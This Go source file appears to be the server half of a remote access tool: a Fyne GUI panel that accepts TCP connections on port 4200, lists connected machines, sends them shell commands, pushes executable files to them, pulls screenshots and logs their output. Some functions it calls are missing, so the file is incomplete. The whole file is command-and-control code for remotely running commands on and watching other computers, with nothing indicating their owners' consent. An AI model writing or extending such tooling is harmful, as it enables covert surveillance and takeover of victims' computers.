package main

import (
	// "bufio"
	"bufio"
	"bytes"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"reflect"
	"strconv"
	"strings"

	"time"
	// "io/ioutil"
	// "image/color"

	// "fyne.io/fyne/canvas"
	// "fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/data/binding"
	"fyne.io/fyne/v2/widget"

	// "golang.org/x/image/colornames"

	"fyne.io/fyne/v2/container"
	// "github.com/vova616/screenshot"
	"fyne.io/fyne/v2/dialog"
	// "fyne.io/fyne/v2/theme"
)

var clientCount = 0

type Client struct {
	clientNo     int
	clientId     net.Conn
	name         string
	connectedAt  string
	activeStatus string
	version      string
}

var clientArr = [50]Client{}

func sendMessage() {
	for {
		if clientCount == 0 {
			continue
		}

		reader := bufio.NewReader(os.Stdin)
		text, _ := reader.ReadString('\n')
		data := []byte(strings.TrimSpace(string(text)))
		c := clientArr[clientCount-1].clientId
		_, err := c.Write(data)
		// fmt.Println(d)
		if err != nil {
			fmt.Println("Error2:", err)
			c.Close()
			return
		}
	}
}

func receveMessage(c1 Client) {
	for {
		buffer := make([]byte, 1024)
		// Read data from the client
		n, err := c1.clientId.Read(buffer)

		if n == 0 {
			for i := range clientArr {
				if clientArr[i].clientId == c1.clientId {
					clientArr[i].activeStatus = "InActive"
					saveCommandResponseInFile(c1, "Client Disconnected")
					return
				}
			}
		} else if err != nil {
			fmt.Println("Error:", err)
			return
		} else if bytes.Equal([]byte("screenshot"), []byte(string(buffer[:n]))) {
			ReceivingAscreenshot(c1)
			continue
		}else if bytes.Equal([]byte("Open_File_manager"), []byte(string(buffer[:len("Open_File_manager")]))) {
			openFileManager(c1,string(buffer[len("Open_File_manager"):n]))
			fmt.Println("end")
		} else {
			saveCommandResponseInFile(c1, string(buffer[:n]))
			fmt.Println("Received:", string(buffer[:n]))
		}
	}
}

func connectClient() {

	PORT := ":4200"
	l, err := net.Listen("tcp", PORT)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println("Server started")
	defer l.Close()

	for {
		c, err := l.Accept()

		if err != nil {
			fmt.Println(err)
			return
		} else {

			t := time.Now()
			myTime := t.Format(time.RFC3339) + "\n"
			hostName := make([]byte, 1024)
			_, _ = c.Write([]byte("c- hostname"))
			d, _ := c.Read(hostName)
			version := make([]byte, 1024)
			_, _ = c.Write([]byte("c- ver"))
			n, _ := c.Read(version)

			var c1 = Client{} // Creating object of client
			c1.clientNo = clientCount + 1
			c1.clientId = c
			c1.connectedAt = strings.TrimSpace(string(myTime))
			c1.activeStatus = "Active"
			c1.name = strings.TrimSpace(string(hostName[:d]))
			c1.version = strings.TrimSpace(string(version[:n]))
			clientArr[clientCount] = c1
			clientCount++
			saveCommandResponseInFile(c1, "Client connected\nSystem name : "+c1.name+"\nversion :"+strings.TrimSpace(c1.version))

			go receveMessage(c1)
		}
	}

}
func main() {

	go sendMessage()
	go connectClient()

	createTable()

}

func createTable() {
	myApp := app.New()
	myWindow := myApp.NewWindow("Client Table")
	myWindow.Resize(fyne.NewSize(1200, 650))
	// openFileManager(myApp, myWindow)
	
	var prevData [][]string
	go func() {
		for range time.Tick(time.Second) {
			// updateTable(tabledata)
			if clientCount < 1 {
				textMessage := widget.NewLabel("")
				textMessage.SetText("Clients not connected yet.")
				myWindow.SetContent(textMessage)
				continue
			}

			// Set header title
			Header := widget.NewLabel("Client Table")
			Header.Resize(fyne.NewSize(300, 100)) // my widget size
			Header.Move(fyne.NewPos(600, 10))     // position of widget

			// Table.....
			var data = make([][]string, clientCount+1)
			for i := range data {
				data[i] = make([]string, 6)
				if i == 0 {
					data[i][0] = "Client No"
					data[i][1] = "Client Id"
					data[i][2] = "System Name"
					data[i][3] = "Active status"
					data[i][4] = "Connected At"
					data[i][5] = "Version"
				} else {
					data[i][0] = strconv.Itoa(i)
					data[i][1] = clientArr[i-1].clientId.RemoteAddr().String()
					data[i][2] = clientArr[i-1].name
					data[i][3] = clientArr[i-1].activeStatus
					data[i][4] = clientArr[i-1].connectedAt
					data[i][5] = clientArr[i-1].version
				}
			}

			if reflect.DeepEqual(prevData, data) {
				continue
			}
			prevData = data
			table := widget.NewTable(
				func() (int, int) {
					return len(data), len(data[0])
				},
				func() fyne.CanvasObject {
					return widget.NewLabel("..............................................\n")
				},
				func(i widget.TableCellID, o fyne.CanvasObject) {
					o.(*widget.Label).SetText(data[i.Row][i.Col])
				})

			table.Resize(fyne.NewSize(1400, 300))
			table.Move(fyne.NewPos(50, 50))

			// select client
			currentClient := clientArr[0]
			var options = make([]string, clientCount)
			for i := 0; i < clientCount; i++ {
				options[i] = string("Client: " + strconv.Itoa(i+1) + " -> " + clientArr[i].name)
			}
			selectEntry := widget.NewSelectEntry(options)
			selectEntry.SetPlaceHolder("Select Client")
			selectEntry.Resize(fyne.NewSize(250, 40))
			selectEntry.Move(fyne.NewPos(50, 500))
			selectEntry.Append(options[0])
			selectEntry.OnChanged = func(selected string) {
				for i := 0; i < len(options); i++ {
					if options[i] == selected {
						currentClient = clientArr[i]
					}
				}
			}

			// input command
			inputString := binding.NewString()
			largeText := widget.NewEntryWithData(inputString)
			largeText.Resize(fyne.NewSize(500, 40))
			largeText.Move(fyne.NewPos(500, 500))
			largeText.SetText("")
			largeText.SetPlaceHolder("Type Command here")

			// file upload
			uploadButton := widget.NewButton("Upload file", func() {
				file_Dialog := dialog.NewFileOpen(
					func(r fyne.URIReadCloser, _ error) {
						//data, _ := ioutil.ReadAll(r)
						filePath := r.URI().Path()
						filePath = strings.Replace(filePath, "/", "\\", -1)
						fmt.Println(filePath)
						largeText.SetText(filePath)
					}, myWindow)
				file_Dialog.Show()
			})
			uploadButton.Resize(fyne.NewSize(100, 40))
			uploadButton.Move(fyne.NewPos(1000, 500))
			uploadButton.Hide()

			// select message type
			commandType := "cmd"
			commandTypeOptions := []string{"File_Upload", "Open_File_manager", "text", "cmd", "screenshot"}
			selectCommandType := widget.NewSelectEntry(commandTypeOptions)
			selectCommandType.SetPlaceHolder("Select command type")
			selectCommandType.Resize(fyne.NewSize(200, 40))
			selectCommandType.Move(fyne.NewPos(300, 500))
			selectCommandType.Append("cmd")
			selectCommandType.OnChanged = func(selected string) {
				commandType = selected
				if commandType == "cmd" || commandType == "text" {
					largeText.Show()
					uploadButton.Hide()
				} else if commandType == "File_Upload" {
					largeText.Show()
					uploadButton.Show()
				} else if commandType == "Open_File_manager" {
					openingFileManager(myApp, myWindow,currentClient)
				} else {
					largeText.Hide()
					uploadButton.Hide()
				}

			}

			// Buttons
			form := &widget.Form{
				Items: []*widget.FormItem{},
				OnCancel: func() {
					inputString.Set("")
				},
				OnSubmit: func() {
					command, _ := inputString.Get()
					sendMessage_new(currentClient, command, commandType)
					inputString.Set("")
				},
			}
			form.Resize(fyne.NewSize(500, 40))
			form.Move(fyne.NewPos(500, 550))

			myWindow.SetContent(
				container.NewWithoutLayout(
					Header,
					table,
					selectEntry,
					selectCommandType,
					largeText,
					uploadButton,
					form,
				),
			)

		}
	}()
	myWindow.CenterOnScreen()
	myWindow.ShowAndRun()
}

func sendMessage_new(ct Client, command string, commandType string) {
	c := ct.clientId
	if commandType == "" {
		fmt.Println("Select Command type")
		return
	}
	if ct.activeStatus == "InActive" {
		fmt.Println("Client Disconnected")
		return
	} else if commandType == "cmd" {
		command = "c- " + command
	} else if commandType == "screenshot" {
		command = "screenshot"
	} else if commandType == "File_Upload" {
		sendFileToClient(ct, command)
		return
	}
	data := []byte(command)
	_, err := c.Write(data)

	if err != nil {
		fmt.Println("Error in sendMessage_new :", err)
		c.Close()
		return
	}
}

func sendFileToClient(ct Client, command string) {
	command = strings.TrimSpace(command)

	res1 := strings.Split(command, "\\")
	size := len(res1)
	fileName := "fileName.exe"
	if res1[size-1] == "" {
		fileName = res1[size-2]
	} else {
		fileName = res1[size-1]
	}

	file, err := os.Open(command)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return
	}
	defer file.Close()

	data := []byte("File_Upload")
	_, _ = ct.clientId.Write(data) //sending command for file upload

	data = []byte(fileName)
	_, _ = ct.clientId.Write(data) // sending file name

	buffer := make([]byte, 1024) // Create a buffer to hold the file data
	for {
		n, err := file.Read(buffer)
		if err == io.EOF {
			break
		}
		if err != nil {
			fmt.Println("Error reading file:", err)
			return
		}
		ct.clientId.Write(buffer[:n])
		if n < 1024 {
			break
		}
	}
	// n, _ := ct.clientId.Read(buffer)
	// fmt.Println("File save at location : "+string(buffer[:n]))
	// saveCommandResponseInFile(ct,"File save at location : "+string(buffer[:n]))
	// fmt.Println("Sent file:", fileName)
}
func saveCommandResponseInFile(c Client, s string) {

	directoryname := "clientData/" + c.name
	if _, err := os.Stat(directoryname); errors.Is(err, os.ErrNotExist) {
		err := os.Mkdir(directoryname, os.ModePerm)
		if err != nil {
			log.Println(err)
		}
	}
	filePath := fmt.Sprintf("%s/%s_%s.%s", directoryname, c.name, strconv.Itoa(c.clientNo), "txt")
	file, err := os.OpenFile(filePath, os.O_RDWR|os.O_CREATE, 0644)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer file.Close()

	// Read the contents of the file
	_, err = ioutil.ReadAll(file)
	if err != nil {
		fmt.Println(err)
		return
	}

	// Write to the file
	t := time.Now()
	myTime := t.Format(time.RFC3339)
	str := myTime + " \n" + s + "\n\n\n"
	_, err = file.WriteString(str)
	if err != nil {
		fmt.Println(err)
		return
	}
}

func ReceivingAscreenshot(c Client) {
	t := time.Now()
	myTime := t.Format(time.RFC3339)
	myTime = strings.Replace(myTime, ":", "-", -1)

	directoryname := "clientData/" + c.name
	if _, err := os.Stat(directoryname); errors.Is(err, os.ErrNotExist) {
		err := os.Mkdir(directoryname, os.ModePerm)
		if err != nil {
			log.Println(err)
		}
	}

	directoryname2 := directoryname + "/screenshot"
	if _, err := os.Stat(directoryname2); errors.Is(err, os.ErrNotExist) {
		err := os.Mkdir(directoryname2, os.ModePerm)
		if err != nil {
			log.Println(err)
		}
	}

	fileName := directoryname2 + "/screenshot-" + string(myTime) + ".png"
	file, err := os.Create(fileName)
	if err != nil {
		fmt.Println("Error creating file:", err)
		return
	}
	defer file.Close()

	// Create a buffer to hold the incoming file data
	buffer := make([]byte, 1024)
	// Receive and write the file data to the new file
	for {
		n, err := c.clientId.Read(buffer)
		if err == io.EOF {
			break
		}
		if err != nil {
			fmt.Println("Error reading file data:", err)
			return
		}
		file.Write(buffer[:n])
		if n < 1024 {
			break
		}
	}
	fmt.Println("Received file:", fileName)
	saveCommandResponseInFile(c, "Received file: "+fileName)
}
